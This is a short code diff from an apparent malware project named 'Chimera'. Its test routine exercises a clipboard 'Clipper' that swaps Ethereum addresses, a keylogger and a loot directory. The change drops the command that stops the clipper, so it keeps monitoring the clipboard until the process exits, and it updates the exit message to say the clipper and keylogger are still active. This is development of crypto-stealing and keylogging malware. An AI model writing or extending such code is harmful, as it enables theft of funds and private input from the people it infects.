@@ -191,7 +191,7 @@ namespace Chimera
             Log("[ETH] swapped: " + (afterEth != testEth ? "YES" : "NO"));
 
             Log(Commands.Clipper.Execute("status"));
-            Log(Commands.Clipper.Execute("stop"));
+            // Clipper stays running — monitoring clipboard until process exits
 
             // ----------------------------------------------------------------
             // STEP 12: Keylogger — start, type test, dump, stop
@@ -212,7 +212,7 @@ namespace Chimera
             Log("Loot dir:  " + LocalConfig.LootDir);
             Log("");
             Log("Review the output above and paste to check for any [-] failures.");
-            Log("Press Enter to exit...");
+            Log("Clipper + Keylogger still active. Press Enter to exit (stops all monitors)...");
 
             logWriter.Close();
             Console.ReadLine();
